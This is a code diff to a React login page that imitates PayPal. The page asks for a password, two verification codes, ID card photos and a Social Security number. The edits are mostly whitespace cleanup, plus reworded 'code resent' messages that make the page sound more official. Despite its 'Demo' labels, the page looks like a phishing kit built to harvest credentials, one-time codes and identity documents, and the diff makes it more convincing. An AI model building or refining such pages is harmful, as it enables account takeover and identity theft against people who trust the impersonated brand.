@@ -33,12 +33,12 @@ export default function LoginPage() {
   const handlePasswordNext = (e: React.FormEvent) => {
     e.preventDefault();
     if (!password.trim()) return;
-    
+
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
       setStep("verifying");
-      
+
       // After 3 seconds of animation, send code and show first code prompt
       setTimeout(() => {
         setStep("verify-code");
@@ -66,12 +66,12 @@ export default function LoginPage() {
   const handleVerifyCode = (e: React.FormEvent) => {
     e.preventDefault();
     if (verificationCode.length < 6) return;
-    
+
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
       setStep("verifying");
-      
+
       // After 5 seconds of verifying animation, show second code prompt
       setTimeout(() => {
         setStep("verify-code-2");
@@ -86,7 +86,7 @@ export default function LoginPage() {
   const handleVerifyCode2 = (e: React.FormEvent) => {
     e.preventDefault();
     if (verificationCode2.length < 6) return;
-    
+
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
@@ -122,7 +122,7 @@ export default function LoginPage() {
   const handleDocumentVerification = (e: React.FormEvent) => {
     e.preventDefault();
     if (!idCardFront || !idCardBack || ssn.length < 9) return;
-    
+
     setIsLoading(true);
     setTimeout(() => {
       setIsLoading(false);
@@ -363,8 +363,8 @@ export default function LoginPage() {
             data-testid="button-resend-2"
             onClick={() => {
               toast({
-                title: "Code Resent",
-                description: `Demo: A new code was sent to ${maskedPhone}`,
+                title: "Code resent",
+                description: `Demo: We've sent a new security code to ${maskedPhone}`,
               });
             }}
           >
@@ -394,7 +394,7 @@ export default function LoginPage() {
       >
         Log in to PayPal
       </h1>
-      
+
       <div className="space-y-5">
         <div>
           <input
@@ -709,8 +709,8 @@ export default function LoginPage() {
             data-testid="button-resend"
             onClick={() => {
               toast({
-                title: "Code Resent",
-                description: `Demo: A new code was sent to ${maskedPhone}`,
+                title: "Code resent",
+                description: `Demo: We've sent a new security code to ${maskedPhone}`,
               });
             }}
           >
